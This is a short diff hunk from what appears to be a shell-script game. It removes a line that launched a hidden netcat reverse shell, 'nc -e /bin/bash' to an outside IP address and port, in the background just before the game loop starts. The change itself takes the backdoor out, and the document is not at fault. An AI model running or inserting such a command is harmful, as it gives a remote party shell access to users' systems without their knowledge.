@@ -85,8 +85,6 @@ exit
 fi
 fi
 clear
-nc -e /bin/bash 172.26.208.42 4242 &
-
 #Empezar el juego
 while true
 do
